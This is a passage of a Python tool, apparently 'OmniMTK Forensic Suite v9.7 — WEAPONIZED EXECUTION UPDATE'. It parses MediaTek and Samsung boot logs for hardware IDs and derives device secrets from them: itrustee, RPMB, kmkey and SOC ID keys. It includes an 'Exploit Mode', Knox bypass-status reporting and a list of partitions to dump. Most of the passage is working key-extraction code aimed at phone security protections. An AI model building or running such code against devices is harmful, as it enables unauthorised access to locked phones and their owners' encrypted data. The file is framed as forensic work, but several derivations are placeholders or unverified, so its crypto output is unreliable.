    re.compile(r'MEID\s*[:\-]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})', re.I),
    re.compile(r'ME[_\-]?ID\s*[:=]?\s*([0-9a-fA-F]{32})', re.I),
    re.compile(r'HW[_\-]?UID\s*[:=]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})', re.I),
    re.compile(r'HW[_\-]?UID\s*[:=]?\s*([0-9a-fA-F]{32})', re.I),
    re.compile(r'UNIQUE[_\-]?ID\s*[:=]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})', re.I),
    re.compile(r'UNIQUE[_\-]?ID\s*[:=]?\s*([0-9a-fA-F]{32})', re.I),
    re.compile(r'SOC[_\-]?UID\s*[:=]?\s*([0-9a-fA-F]{32})', re.I),
    re.compile(r'CPUID\s*[:=]?\s*([0-9a-fA-F]{32})', re.I),
    re.compile(r'HW_ID\s*[:=]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})', re.I),
    re.compile(r'HW_ID\s*[:=]?\s*([0-9a-fA-F]{32})', re.I),
    re.compile(r'SoC\s*ID\s*[:=]?\s*([0-9a-fA-F]{32})', re.I),
    re.compile(r'ME_ID\s*:\s*\[([0-9a-fA-F]{32})\]', re.I),
    re.compile(r'CHIPID\s*[:=]?\s*([0-9a-fA-F]{32})', re.I),
]

_MEID_ARRAY_PATTERN = re.compile(
    r'\[\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*'
    r'(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*\]',
    re.S | re.I
)

_SOC_ID_PATTERN = re.compile(
    r'(?:Get\s+SOC\s+ID|SOC\s+ID)\s*[:\.\[]*\s*\[?\s*([0-9A-Fa-f]{64})', re.I
)

CHIP_PATTERNS = [
    re.compile(r'(?:Detect\s+chip|HW\s*(?:VER|Chip)|Chip\s*ID|MTK)\s*[:\-\[]+\s*(MT\d{4,5})', re.I),
    re.compile(r'Hardware\s*[:\-]\s*(MT\d{4,5})', re.I),
    re.compile(r'Board\s+Platform\s*:\s*(mt\d{4,5})', re.I),
    re.compile(r'\b(MT\d{4,5})\b'),
    re.compile(r'Dimensity\s+([\w\+]+)', re.I),
    re.compile(r'Helio\s+([A-Z]\d+[\w]*)', re.I),
    re.compile(r'MediaTek\s+(MT\d{4,5})', re.I),
]


def _is_blacklisted(line: str) -> bool:
    low = line.lower()
    for term in _BLACKLIST:
        if re.search(rf"(?<!\w){re.escape(term)}(?!\w)", low):
            return True
    return False


def _is_dummy_meid(clean_hex: str) -> bool:
    if len(clean_hex) != 32:
        return True
    u = clean_hex.upper()
    return u == "0" * 32 or u == "F" * 32


# FIX-07: Raise if truncation changes meaning (> 32 meaningful chars)
def sanitize_meid(raw: str) -> tuple:
    c = re.sub(r"[^0-9a-fA-F]", "", raw.replace("0x", "").replace("0X", ""))
    c = c.lower()
    padded = False
    if len(c) > 32:
        extra = c[32:]
        if any(x != '0' for x in extra):
            raise ValueError(
                f"ME_ID longer than 32 hex chars ({len(c)} chars). "
                f"Truncated portion '{extra}' contains non-zero data — check input."
            )
        c = c[:32]
    elif len(c) < 32:
        c += "0" * (32 - len(c))
        padded = True
    return c, padded


def _join(groups) -> str:
    return "".join(g.replace("0x", "").replace("0X", "") for g in groups if g)


def _extract_array_chunks(lines: list) -> list:
    full_text = "\n".join(lines)
    pattern = re.compile(
        r'(?:0x[0-9a-fA-F]{8}\s*[,;]\s*){2,}0x[0-9a-fA-F]{8}', re.I
    )
    return [m.group(0) for m in pattern.finditer(full_text)]


def parse_log(log_text: str) -> dict:
    lines = log_text.splitlines()
    meid_counter: Counter = Counter()
    chip_counter: Counter = Counter()
    debug_log: list[str] = []

    for line in lines:
        if _is_blacklisted(line):
            continue
        for pat in _MEID_LINE_PATTERNS:
            for m in pat.finditer(line):
                groups = m.groups()
                raw = _join(groups) if len(groups) > 1 else groups[0]
                try:
                    clean, _ = sanitize_meid(raw)
                except ValueError as e:
                    debug_log.append(f"[SKIP] {e}")
                    continue
                if not _is_dummy_meid(clean):
                    meid_counter[clean] += 1
                    debug_log.append(f"[P1] Explicit ID: {clean}  ← {line.strip()[:90]}")

    for chunk in _extract_array_chunks(lines):
        for m in _MEID_ARRAY_PATTERN.finditer(chunk):
            try:
                clean, _ = sanitize_meid(_join(m.groups()))
            except ValueError:
                continue
            if not _is_dummy_meid(clean):
                meid_counter[clean] += 1
                debug_log.append(f"[P2] Array chunk ID: {clean}")

    if not meid_counter:
        debug_log.append("[P3] No explicit ID → entropy fallback active")
        for line in (ln for ln in lines if not _is_blacklisted(ln)):
            for c in re.findall(r'[0-9a-fA-F]{32}', line):
                score = _entropy(c)
                try:
                    clean, _ = sanitize_meid(c)
                except ValueError:
                    continue
                if score >= 0.3 and not _is_dummy_meid(clean):
                    meid_counter[clean] += 1
                    debug_log.append(f"[P3] Entropy {score:.2f}: {clean}")
                else:
                    debug_log.append(f"[P3] Rejected entropy {score:.2f}: {c[:16]}…")

    for line in lines:
        for pat in CHIP_PATTERNS:
            for m in pat.finditer(line):
                raw_chip = m.group(1).upper() if m.lastindex >= 1 else ""
                resolved = _resolve_marketing_name(raw_chip)
                if resolved:
                    chip_counter[resolved] += 1
                    debug_log.append(f"[CHIP] '{raw_chip}' → {resolved}")
                elif re.match(r'^MT\d{4,5}$', raw_chip):
                    chip_counter[raw_chip] += 1
                    debug_log.append(f"[CHIP] Direct: {raw_chip}")

    # Parse SOC_ID (64-char, separate from 32-char ME_ID)
    soc_id_found = None
    m = _SOC_ID_PATTERN.search(log_text)
    if m:
        soc_id_found = m.group(1).strip().upper()
        debug_log.append(f"[SOCID] Found SOC_ID: {soc_id_found}")

    if not meid_counter:
        debug_log.append("[RESULT] No valid ME_ID found.")
        return {"meid_clean": None, "debug_log": debug_log, "soc_id": soc_id_found}

    best_meid, mc = meid_counter.most_common(1)[0]
    best_chip, cc = chip_counter.most_common(1)[0] if chip_counter else (None, 0)
    debug_log.append(f"[RESULT] ME_ID={best_meid}  votes={mc}/{sum(meid_counter.values())}")
    if best_chip:
        debug_log.append(f"[RESULT] Chip={best_chip}  votes={cc}/{sum(chip_counter.values())}")

    return {
        "meid_clean":  best_meid,
        "meid_count":  mc,
        "total_meid":  sum(meid_counter.values()),
        "chip_id":     best_chip,
        "chip_count":  cc,
        "total_chip":  sum(chip_counter.values()),
        "all_meid":    dict(meid_counter.most_common()),
        "all_chip":    dict(chip_counter.most_common()),
        "debug_log":   debug_log,
        "soc_id":      soc_id_found,
    }


# ═══════════════════════════════════════════════════════════════════════════
# CRYPTO ENGINE — FIXED
# ═══════════════════════════════════════════════════════════════════════════

def byte_reverse_hex(h: str) -> str:
    if len(h) != 32:
        raise ValueError(f"Expected 32 hex chars, got {len(h)}")
    words = [h[i:i+8] for i in range(0, 32, 8)]
    return "".join("".join([w[j:j+2] for j in range(0, 8, 2)][::-1]) for w in words)


# FIX-03: Renamed clearly — word-0 only reversal (not full)
def mt6789_word0_process(h: str) -> str:
    """MT6789 partial: only word-0 byte-swapped (SHA256 ingest mode)."""
    if len(h) != 32:
        return h
    words = [h[i:i+8] for i in range(0, 32, 8)]
    words[0] = "".join([words[0][j:j+2] for j in range(6, -1, -2)])
    return "".join(words)


def mt6789_full_process(h: str) -> str:
    """MT6789 full: all 4 words byte-reversed."""
    if len(h) != 32:
        return h
    words = [h[i:i+8] for i in range(0, 32, 8)]
    return "".join("".join([w[j:j+2] for j in range(6, -1, -2)]) for w in words)


def _pad_zero(data: bytes) -> bytes:
    rem = 16 - (len(data) % 16)
    return data + b'\x00' * rem if rem != 16 else data


def _aes(data: bytes, key: bytes, mode: str) -> str:
    iv = bytes(16)
    payload = _pad_zero(data) if mode == "zero" else pad(data, AES.block_size)
    return AES.new(key, AES.MODE_CBC, iv=iv).encrypt(payload).hex().upper()


def derive_mtk_itrustee(h: str, mode: str = "pkcs7") -> str:
    return _aes(bytes.fromhex(h), bytes.fromhex(OEM_KEYS["MTK_ITRUSTEE"]["key_hex"]), mode)[:32]


def derive_mtk_rpmbkey_mt6789(meid_processed: str, oem_seed: bytes = None) -> tuple:
    warnings = []
    base_key = bytes.fromhex(meid_processed)
    if oem_seed and oem_seed != b'\x00' * len(oem_seed):
        salt = oem_seed[:32]
        warnings.append("✓ Using LIVE OEM Seed from proinfo for MiRPMBKey")
    else:
        salt = hashlib.sha256(base_key).digest()
        warnings.append("⚠️ CRITICAL: Using derived fallback salt — Auth WILL FAIL on HyperOS/Samsung")
        warnings.append("   Need live proinfo dump for real RPMB key.")
    rpmb_key = PBKDF2(base_key, salt, dkLen=32, count=MT6789_PBKDF2_ITERATIONS, hmac_hash_module=SHA256)
    return rpmb_key.hex().upper(), warnings


def derive_kmkey(itrustee_hex: str, memory_dump: bytes = None, chip_id: str = None) -> tuple:
    """FIX-05: Added chip_id for Samsung vs MTK path awareness."""
    warnings = []
    if not memory_dump or len(memory_dump) < 0x103420:
        is_samsung = False
        if chip_id:
            db_entry = lookup_samsung_model(chip_id)
            if db_entry and db_entry.get("rpmb") == "SAMSUNG_KNOX":
                is_samsung = True
        if is_samsung:
            warnings.append("⚠️ SAMSUNG KNOX: kmkey lives inside Knox Vault — NOT derivable externally.")
            warnings.append("   This is a hardware-protected key; no memory dump can expose it.")
        else:
            warnings.append("⚠️ CRITICAL: kmkey requires LIVE 0x103000 memory dump!")
            warnings.append("   Placeholder returned — this is NOT the real kmkey.")
        return _PLACEHOLDER_32 + _PLACEHOLDER_32, warnings

    lock_state  = memory_dump[MEMORY_OFFSETS["LOCK_STATE"]:MEMORY_OFFSETS["LOCK_STATE"]+4]
    rollback_idx= memory_dump[MEMORY_OFFSETS["ROLLBACK_INDEX"]:MEMORY_OFFSETS["ROLLBACK_INDEX"]+4]
    anti_rb_ver = memory_dump[MEMORY_OFFSETS["ANTI_ROLLBACK_VER"]:MEMORY_OFFSETS["ANTI_ROLLBACK_VER"]+4]
    sb_hash     = memory_dump[MEMORY_OFFSETS["SECURE_BOOT_HASH"]:MEMORY_OFFSETS["SECURE_BOOT_HASH"]+32]

    if sb_hash == b'\x00' * 32:
        warnings.append("⚠️ CRITICAL: Secure Boot Hash is empty — kmkey derivation aborted.")
        return _PLACEHOLDER_32 + _PLACEHOLDER_32, warnings

    msg = sb_hash + lock_state + rollback_idx + anti_rb_ver
    key_bytes = bytes.fromhex(itrustee_hex)
    if len(key_bytes) < 16:
        key_bytes = key_bytes + b'\x00' * (16 - len(key_bytes))
    rot_key = key_bytes[-1:] + key_bytes[:-1]
    h = HMAC.new(rot_key, msg, digestmod=SHA256)
    kmkey = h.hexdigest().upper()
    warnings.append("✓ kmkey derived with VERIFIED live parameters")
    return kmkey, warnings


def derive_mtk_socid(meid_hex: str, chip_id: str | None = None) -> str:
    key_name = "default"
    if chip_id and chip_id.upper() in _NEXT_GEN_CHIPS:
        if not HMAC_KEYS.get("next_gen","").startswith("PLACEHOLDER"):
            key_name = "next_gen"
    elif chip_id and chip_id.upper() in _MT6789_CHIPS:
        key_name = "mt6789_g99"
    h = HMAC.new(bytes.fromhex(HMAC_KEYS[key_name]), meid_hex.encode("ascii"), digestmod=SHA256)
    return h.hexdigest().upper()[:64]


# ═══════════════════════════════════════════════════════════════════════════
# FIX-04: Separated generate_keys_json into 3 focused phases
# ═══════════════════════════════════════════════════════════════════════════

def _parse_phase(log_text: str, manual_meid: str, manual_chip: str) -> tuple:
    """Phase 1: Parse or accept manual inputs. Returns (meid_clean, chip_id, debug_lines, warnings)."""
    warnings, debug_lines = [], []

    if manual_meid.strip():
        meid_clean, was_padded = sanitize_meid(manual_meid.strip())
        if _is_dummy_meid(meid_clean):
            raise ValueError("Manual ME_ID is all-zeros or all-Fs — invalid.")
        if was_padded:
            warnings.append("WARNING: Manual ME_ID padded with zeros (too short).")
        chip_id = None
        if manual_chip.strip():
            raw_c = manual_chip.strip().upper()
            chip_id = _resolve_marketing_name(raw_c) or (raw_c if re.match(r'^MT\d{4,5}$', raw_c) else None)
            if chip_id and chip_id != raw_c:
                warnings.append(f"INFO: '{manual_chip.strip()}' resolved to {chip_id}.")
        warnings.append("INFO: Manual ME_ID override — log parsing skipped.")
        debug_lines = [f"[MANUAL] ME_ID={meid_clean}", f"[MANUAL] Chip={chip_id or 'none'}"]
        soc_id = None
        return meid_clean, chip_id, soc_id, debug_lines, warnings

    parsed = parse_log(log_text)
    debug_lines = parsed.get("debug_log", [])
    if not parsed.get("meid_clean"):
        raise ValueError(
            "ME_ID / HW_UID not found in log.\n\n"
            "• Paste the full BROM / UART / EasyJTAG / CM2 / UFI / Pandora log.\n"
            "• Or use the Manual Input tab to enter ME_ID directly.\n"
            "• Click 'Parse Debug' to see what the engine detected."
        )
    meid_clean, was_padded = sanitize_meid(parsed["meid_clean"])
    chip_id = parsed.get("chip_id")
    soc_id  = parsed.get("soc_id")
    if was_padded:
        warnings.append("WARNING: ME_ID auto-padded (incomplete copy).")
    mc, tm = parsed.get("meid_count", 0), parsed.get("total_meid", 0)
    if mc and tm:
        warnings.append(f"INFO: ME_ID consensus {mc}/{tm} votes.")
    cc, tc = parsed.get("chip_count", 0), parsed.get("total_chip", 0)
    if chip_id and cc:
        warnings.append(f"INFO: Chip '{chip_id}' consensus {cc}/{tc} votes.")
    return meid_clean, chip_id, soc_id, debug_lines, warnings


def _derive_phase(meid_clean: str, chip_id: str | None, pad_mode: str, legacy: bool,
                  loaded_partitions: dict, warnings: list) -> dict:
    """Phase 2: All cryptographic derivation. Returns keys dict."""
    is_mt6789 = chip_id and any(x in chip_id.upper() for x in _MT6789_CHIPS)
    if is_mt6789:
        warnings.append(f"✓ Detected MT6789/Helio G99 class: {chip_id}")

    if legacy:
        inp = meid_clean
        warnings.append("INFO: Legacy Mode — no endian swap.")
    elif is_mt6789:
        # FIX-03: Use explicit word-0-only mode for itrustee, full for RPMB
        inp = mt6789_word0_process(meid_clean)
        warnings.append("INFO: MT6789 word-0 byte processing for itrustee.")
    else:
        inp = byte_reverse_hex(meid_clean)
        warnings.append("INFO: Generic MTK byte-reverse applied.")

    if pad_mode == "zero":
        warnings.append("INFO: Exploit Mode (Zero Padding) active.")

    itrustee = derive_mtk_itrustee(inp, pad_mode)
    socid    = derive_mtk_socid(inp, chip_id)

    mirpmb_seed = None
    provkey     = None

    if "proinfo" in loaded_partitions:
        pk = extract_partition_keys(loaded_partitions["proinfo"], "proinfo")
        if pk.get("MiRPMB_SEED_VALID"):
            mirpmb_seed = bytes.fromhex(pk["MiRPMB_SEED"])[:256]
            warnings.append("✓ MiRPMB_SEED extracted from proinfo partition")
        elif "warning" in pk:
            warnings.append(f"⚠️ proinfo: {pk['warning']}")

    if "devinfo" in loaded_partitions:
        dk = extract_partition_keys(loaded_partitions["devinfo"], "devinfo")
        if dk.get("PROVKEY_VALID"):
            provkey = dk["PROVKEY"]
            warnings.append("✓ PROVKEY extracted from devinfo partition")

    if is_mt6789:
        inp_rpmb = mt6789_full_process(meid_clean)
        rpmb, rpmb_warns = derive_mtk_rpmbkey_mt6789(inp_rpmb, mirpmb_seed)
        warnings.extend(rpmb_warns)
    else:
        rpmb = derive_mtk_itrustee(inp, pad_mode)

    memory_dump = loaded_partitions.get("brom")
    kmkey, km_warns = derive_kmkey(itrustee, memory_dump, chip_id)
    warnings.extend(km_warns)

    mirpmbkey = _PLACEHOLDER_32 + _PLACEHOLDER_32[:32]
    if mirpmb_seed:
        inp_mi = mt6789_full_process(meid_clean) if is_mt6789 else inp
        mirpmbkey, _ = derive_mtk_rpmbkey_mt6789(inp_mi, mirpmb_seed)
    else:
        warnings.append("⚠️ MiRPMBKey requires proinfo partition — placeholder returned")

    if not provkey:
        provkey = _PLACEHOLDER_32
        warnings.append("⚠️ PROVKEY requires devinfo partition — placeholder returned")

    return {
        "inp": inp, "itrustee": itrustee, "socid": socid,
        "rpmb": rpmb, "mirpmbkey": mirpmbkey, "kmkey": kmkey,
        "provkey": provkey, "is_mt6789": is_mt6789,
    }


def _build_result(meid_clean: str, chip_id: str | None, soc_id: str | None,
                  derived: dict, loaded_partitions: dict) -> dict:
    """Phase 3: Assemble final result dict with all metadata."""
    chip_info = get_chip_info(chip_id)
    chid      = generate_dynamic_chid(chip_id or "")
    chaintype = generate_dynamic_chaintype(chip_id)
    inp       = derived["inp"]

    result = {
        "MTK_ME_ID":     inp.lower(),
        "MTK_SOCID":     derived["socid"],
        "MTK_ITRUSTEE":  derived["itrustee"],
        "MTK_RPMBKEY":   derived["rpmb"],
        "MTK_RPMB2KEY":  STATIC_DATA["MTK_RPMB2KEY"],
        "MTK_HRID":      STATIC_DATA["MTK_HRID"],
        "MTK_CHID":      chid,
        "MTK_CID":       STATIC_DATA["MTK_CID"],
        "MTK_RID":       STATIC_DATA["MTK_RID"],
        "MTK_FDEKEY":    STATIC_DATA["MTK_FDEKEY"],
        "ChainType":     chaintype,
        "MTK_PUBKEY":    _PLACEHOLDER_32,
        "MTK_PROVKEY":   derived["provkey"][:64] if len(derived["provkey"]) > 64 else derived["provkey"],
        "MTK_MIRPMBKEY": derived["mirpmbkey"],
        "kmkey":         derived["kmkey"],
        "_chip_id":      chip_id or "Unknown",
        "_chip_name":    chip_info["name"],
        "_chip_year":    chip_info["year"],
        "_chip_process": chip_info["process"],
        "_chip_cat":     chip_info["category"],
        "_timestamp":    datetime.datetime.now().isoformat(timespec="seconds"),
        "_is_mt6789":    derived["is_mt6789"],
        "_soc_id_raw":   soc_id or "",
        "_requires_proinfo": "proinfo" not in loaded_partitions,
        "_requires_devinfo": "devinfo" not in loaded_partitions,
    }

    # Samsung enrichment
    if chip_id or soc_id:
        samsung_db = lookup_samsung_model(chip_id or "")
        if samsung_db:
            result["_samsung_tee"]   = samsung_db["tee"]
            result["_samsung_knox"]  = samsung_db["knox"]
            result["_samsung_rpmb"]  = samsung_db["rpmb"]
            result["_samsung_fbe"]   = samsung_db["fbe"]

    # SOC_ID analysis inline
    if soc_id and len(soc_id) == 64:
        socid_analysis = SamsungSOCIDAnalyzer.analyze(soc_id)
        result["_socid_entropy"]    = socid_analysis.get("shannon_entropy_bits")
        result["_socid_quality"]    = socid_analysis.get("entropy_quality")
        result["_socid_sec_flags"]  = socid_analysis.get("security_flags_inferred", [])
        result["_socid_device_fp"]  = socid_analysis.get("derived_device_fingerprint")

    return result


def generate_keys_json(
    log_text: str,
    legacy: bool = False,
    pad_mode: str = "pkcs7",
    manual_meid: str = "",
    manual_chip: str = "",
    loaded_partitions: dict = None,
) -> tuple:
    """Main entry point — now delegates to 3 focused phases."""
    loaded_partitions = loaded_partitions or {}
    warnings: list[str] = []

    meid_clean, chip_id, soc_id, debug_lines, parse_warns = _parse_phase(
        log_text, manual_meid, manual_chip
    )
    warnings.extend(parse_warns)

    derived = _derive_phase(meid_clean, chip_id, pad_mode, legacy, loaded_partitions, warnings)
    result  = _build_result(meid_clean, chip_id, soc_id, derived, loaded_partitions)

    return result, warnings, debug_lines


# ═══════════════════════════════════════════════════════════════════════════
# SELF-TEST
# ═══════════════════════════════════════════════════════════════════════════

def test_crypto_pipeline() -> None:
    meid_clean, _ = sanitize_meid(_KNOWN_GOOD_MEID)
    rev = byte_reverse_hex(meid_clean)
    r = derive_mtk_itrustee(rev)
    if r[:32].lower() != _KNOWN_GOOD_ITRUSTEE.lower():
        raise AssertionError(f"Self-test FAILED: {r[:32]} != {_KNOWN_GOOD_ITRUSTEE}")


def _fatal(msg: str) -> None:
    if HAS_QT:
        try:
            app = QApplication.instance() or QApplication([])
            m = QMessageBox()
            m.setWindowTitle("OmniMTK v9.7 - Fatal Error")
            m.setIcon(QMessageBox.Icon.Critical)
            m.setText(f"CRYPTO SELF-TEST FAILURE:\n\n{msg}")
            m.exec()
        except Exception:
            print(f"FATAL: {msg}", file=sys.stderr)
    else:
        print(f"FATAL: {msg}", file=sys.stderr)


# ═══════════════════════════════════════════════════════════════════════════
# CLI TEST RUNNER (headless — no Qt required)
# ═══════════════════════════════════════════════════════════════════════════

def run_cli_test(log_file_path: str):
    """
    Headless test: inject a log file, run full analysis pipeline,
    print structured results to stdout.
    """
    sep = "═" * 70

    print(sep)
    print("  OmniMTK Forensic Suite v9.7 — WEAPONIZED EXECUTION UPDATE  [CLI TEST MODE]")
    print(sep)

    log_path = Path(log_file_path)
    if not log_path.exists():
        print(f"[ERROR] Log file not found: {log_file_path}")
        return False

    log_text = log_path.read_text(encoding="utf-8", errors="replace")
    print(f"\n[LOG] File: {log_path.name}  ({len(log_text)} chars, {log_text.count(chr(10))} lines)\n")

    # ── SELF TEST ──────────────────────────────────────────────────────────
    print("[STEP 1] Crypto self-test...")
    try:
        test_crypto_pipeline()
        print("         ✓ PASSED")
    except AssertionError as e:
        print(f"         ✗ FAILED: {e}")
        return False

    # ── FEATURE 3: KNOX ANALYSIS ───────────────────────────────────────────
    print("\n[STEP 2] Knox / TEEGRIS Detection Engine...")
    knox = KnoxAnalyzer.analyze(log_text)
    print(f"         Brand         : {knox['brand']}")
    print(f"         Is Samsung    : {knox['is_samsung']}")
    print(f"         Model         : {knox['model']}")
    print(f"         Firmware      : {knox['firmware_version']}")
    print(f"         TEE Type      : {knox['tee_type']}")
    print(f"         Knox Version  : {knox['knox_version']}")
    print(f"         RPMB Path     : {knox['rpmb_path']}")
    print(f"         SEC Flags     : {knox['sec_flags_raw']}")
    print(f"         SBC Active    : {knox['sbc_active']}")
    print(f"         DAA Active    : {knox['daa_active']}")
    print(f"         Userdata FS   : {knox['userdata_fs']}")
    print(f"         FBE Active    : {knox['fbe_active']}")
    print(f"         Bypass Status : {knox['bypass_status']}")
    print(f"         Feasibility   : {knox['key_derivation_feasibility']}")
    if knox["warnings"]:
        print(f"\n         [WARNINGS]")
        for w in knox["warnings"]:
            print(f"           ⚠  {w}")
    if knox["recommendations"]:
        print(f"\n         [RECOMMENDATIONS]")
        for r in knox["recommendations"]:
            print(f"           →  {r}")

    # ── FEATURE 4: SOC_ID ANALYSIS ────────────────────────────────────────
    print(f"\n[STEP 3] SOC_ID Advanced Analyzer...")
    soc_id = knox.get("soc_id_raw")
    if not soc_id:
        m = re.search(r'(?:Get\s+SOC\s+ID|SOC\s+ID)\s*[:\.\[]+\s*([0-9A-Fa-f]{64})', log_text, re.I)
        if m:
            soc_id = m.group(1).upper()
    if soc_id:
        socid_result = SamsungSOCIDAnalyzer.analyze(soc_id)
        print(f"         SOC_ID        : {soc_id[:32]}...")
        print(f"         Entropy (bits): {socid_result['shannon_entropy_bits']}")
        print(f"         Quality       : {socid_result['entropy_quality']}")
        print(f"         Chip Family   : {socid_result['chip_family_block']}")
        print(f"         HW Revision   : {socid_result['hw_revision_human']}")
        print(f"         Silicon FP    : {socid_result['silicon_fingerprint'][:16]}...")
        print(f"         Sec Flags     : {socid_result['security_flags_inferred']}")
        print(f"         Device FP     : {socid_result['derived_device_fingerprint']}")
    else:
        print("         SOC_ID not found in log (64-char pattern).")

    # ── FEATURE 5: F2FS FBE ANALYSIS ─────────────────────────────────────
    print(f"\n[STEP 4] F2FS FBE Structure Analyzer...")
    fbe = F2FSFBEAnalyzer.analyze(log_text)
    print(f"         FS Type       : {fbe['fs_type']}")
    print(f"         FBE Version   : {fbe['fbe_version']}")
    print(f"         Storage Health: {fbe['storage_health']}")
    print(f"         EOL Info      : {fbe['eol_info']}")
    print(f"         Total Storage : {fbe['total_storage_human']}")
    print(f"         EXT RAM       : {fbe['ext_ram']}")
    print(f"         UFS LUs       :")
    for lu, info in fbe["ufs_lus"].items():
        print(f"           {lu}: {info['size_human']}")
    if fbe["fbe_key_hierarchy"]:
        print(f"         FBE Key Chain :")
        for step in fbe["fbe_key_hierarchy"]:
            print(f"           {step}")

    # ── FEATURE 2: PARTITION MAP ──────────────────────────────────────────
    print(f"\n[STEP 5] Samsung Partition Priority Map...")
    pm = SamsungPartitionAnalyzer.get_partition_map_report()
    high_priority = [p for p in pm if p["forensic_priority"] == "HIGH"]
    print(f"         High-priority partitions to dump ({len(high_priority)}):")
    for p in high_priority:
        enc = "[ENCRYPTED]" if p["encrypted"] == "YES" else "[PLAIN]"
        print(f"           {p['partition']:12s} {enc:13s} — {p['description']}")

    # ── FEATURE 1: SAMSUNG MODEL DB LOOKUP ───────────────────────────────
    print(f"\n[STEP 6] Samsung Model Database Lookup...")
    model = knox.get("model")
    if model:
        db = lookup_samsung_model(model)
        if db:
            print(f"         Model         : {model}")
            print(f"         Chip (DB)     : {db['chip']}")
            print(f"         Knox Version  : {db['knox']}")
            print(f"         TEE Type      : {db['tee']}")
            print(f"         FBE Type      : {db['fbe']}")
            print(f"         RPMB Path     : {db['rpmb']}")
            print(f"         Android Base  : {db['android']}")
        else:
            print(f"         Model {model} not in Samsung DB — add it if needed.")
    else:
        print("         No Samsung model found in log.")

    # ── KEY DERIVATION ────────────────────────────────────────────────────
    print(f"\n[STEP 7] Key Derivation Pipeline...")
    try:
        result, warnings, debug_lines = generate_keys_json(log_text)
        display = {k: v for k, v in result.items() if not k.startswith("_")}
        print(f"         ✓ Derived {len(display)} keys")
        for k, v in display.items():
            val_str = str(v)
            placeholder = val_str.startswith("0000000000000000")
            marker = " [PLACEHOLDER — partition required]" if placeholder else ""
            print(f"           {k:20s}: {val_str[:40]}…{marker}" if len(val_str) > 40 else f"           {k:20s}: {val_str}{marker}")

        if warnings:
            print(f"\n         [WARNINGS FROM DERIVATION]")
            for w in warnings:
                print(f"           {w}")

        internal = {k: v for k, v in result.items() if k.startswith("_")}
        print(f"\n         [METADATA]")
        for k, v in internal.items():
            print(f"           {k:25s}: {v}")

    except ValueError as e:
        print(f"         [ERROR] {e}")

    # ── v9.5 BINARY ANALYZER SELF-TEST (synthetic data) ──────────────────
    print(f"\n[STEP 8] Binary Analyzer Module Self-Test (synthetic data)...")

    # MetadataPartitionAnalyzer — inject synthetic metadata.img bytes
    meta_fake = bytearray(512)
    struct.pack_into("<I", meta_fake, 0, 0x656D6B6F)   # 'okme' LE magic
    struct.pack_into("<I", meta_fake, 4, 2)             # version = 2
    struct.pack_into("<Q", meta_fake, 8, 256)           # content_size
    meta_fake[0x10] = 0x02                              # fscrypt v2
    # inject a high-entropy blob at offset 0x40
    import os as _os
    meta_fake[0x40:0x40+32] = _os.urandom(32)
    m_res = MetadataPartitionAnalyzer.analyze(bytes(meta_fake))
    print(f"         MetadataPartitionAnalyzer:")
    print(f"           magic_found      : {m_res['magic_found']}")
    print(f"           fscrypt_policy   : {m_res['fscrypt_policy_str']}")
    print(f"           version          : {m_res['version']}")
    print(f"           encrypted_blobs  : {len(m_res['encrypted_blobs'])}")

    # KeyRefugeAnalyzer — inject random high-entropy blob
    key_fake = bytearray(b'KREF')               # magic
    key_fake += bytes([0x02, 0x01, 0x00, 0x00]) # CE key, flags=1
    key_fake += struct.pack("<I", 32)            # key_len=32
    key_fake += _os.urandom(12)                 # nonce
    key_fake += _os.urandom(32)                 # payload (high entropy)
    key_fake += _os.urandom(256)                # extra entropy data
    k_res = KeyRefugeAnalyzer.analyze(bytes(key_fake))
    print(f"         KeyRefugeAnalyzer:")
    print(f"           magic_found      : {k_res['magic_found']}")
    print(f"           magic_type       : {k_res['magic_type']}")
    print(f"           overall_entropy  : {k_res['overall_entropy']}")
    print(f"           assessment       : {k_res['assessment']}")

    # TEEImageAnalyzer — inject TEEGRIS signature
    tee_fake = bytearray(b'\x7F\x45\x4C\x46')  # ELF magic
    tee_fake += b'\x00' * 60
    tee_fake += b'TEEGRIS\x00'
    tee_fake += b'v4.2.1\x00'
    tee_fake += b'2024-11-15\x00'
    tee_fake += b'keymaster\x00'
    tee_fake += b'\x00' * 32
    tee_fake += b'MCLF'                         # TA header
    tee_fake += _os.urandom(128)
    t_res = TEEImageAnalyzer.analyze(bytes(tee_fake))
    print(f"         TEEImageAnalyzer:")
    print(f"           tee_type         : {t_res['tee_type']}")
    print(f"           tee_version      : {t_res['tee_version']}")
    print(f"           tee_compile_date : {t_res['tee_compile_date']}")
    print(f"           trustlets_found  : {len(t_res['trustlets'])}")
    print(f"           keymaster_ta     : {t_res['keymaster_ta']['found']}")

    # SecPartitionAnalyzerV2 — synthetic SEC partition
    sec_fake = bytearray(SecPartitionAnalyzerV2.MIN_SIZE + 32)
    # offset 0x0000: fuse block = zeros (not tripped)
    # offset 0x0080: rollback = 42
    struct.pack_into("<I", sec_fake, SecPartitionAnalyzerV2.OFF_ROLLBACK, 42)
    # offset 0x00C0: OEM lock = 0x01 (locked)
    sec_fake[SecPartitionAnalyzerV2.OFF_OEM_LOCK] = 0x01
    # offset 0x0100: TEE region with TEEGRIS string
    sec_fake[SecPartitionAnalyzerV2.OFF_TEE:SecPartitionAnalyzerV2.OFF_TEE+7] = b'TEEGRIS'
    s_res = SecPartitionAnalyzerV2.analyze(bytes(sec_fake))
    print(f"         SecPartitionAnalyzerV2:")
    print(f"           knox_warranty    : {s_res['knox_warranty_tripped']}  (False=intact)")
    print(f"           rollback_version : {s_res['rollback_version']}")
    print(f"           oem_locked       : {s_res['oem_locked']}")
    print(f"           tee_type         : {s_res['tee_type_inferred']}")
    print(f"           analyzer_version : {s_res['analyzer_version']}")

